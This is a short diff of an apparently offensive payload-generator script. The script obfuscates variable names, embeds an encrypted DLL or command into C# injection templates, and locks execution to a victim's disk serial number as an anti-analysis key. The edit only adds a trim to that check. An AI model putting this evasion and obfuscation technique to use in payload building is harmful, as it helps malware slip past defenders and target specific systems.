@@ -148,7 +148,7 @@ try:
             wmi_HD = Obfuscator.obfVar()
             check = "string "+envKey+" = \"\";\n\t\t\t"
             check += "ManagementObjectSearcher "+moSearcher+" = new ManagementObjectSearcher(\"SELECT * FROM Win32_DiskDrive\");\n\t\t\t"
-            check += "foreach (ManagementObject "+wmi_HD+" in "+moSearcher+".Get()){"+envKey+" = "+wmi_HD+"[\"SerialNumber\"].ToString();break;}"
+            check += "foreach (ManagementObject "+wmi_HD+" in "+moSearcher+".Get()){"+envKey+" = "+wmi_HD+"[\"SerialNumber\"].ToString().Trim();break;}"
         # Replace original variable and function names with obfuscated ones
         with open("templates/spotter-inject.cs", "rt") as fin:
             r1 = fin.read().replace('encDllB64', encDllB64)
@@ -204,7 +204,7 @@ try:
             moSearcher = Obfuscator.obfVar()
             wmi_HD = Obfuscator.obfVar()
             check = "string "+envKey+" = '';\nManagementObjectSearcher "+moSearcher+" = new ManagementObjectSearcher('SELECT * FROM Win32_DiskDrive');\n"
-            check += "foreach (ManagementObject "+wmi_HD+" in "+moSearcher+".Get()){"+envKey+" = "+wmi_HD+"['SerialNumber'].ToString();break;};"
+            check += "foreach (ManagementObject "+wmi_HD+" in "+moSearcher+".Get()){"+envKey+" = "+wmi_HD+"['SerialNumber'].ToString().Trim();break;};"
         #print(encrypted)
         with open("templates/spotter-process.cs", "rt") as fin:
             r1 = fin.read().replace('ENCODED_COMMAND', encrypted)
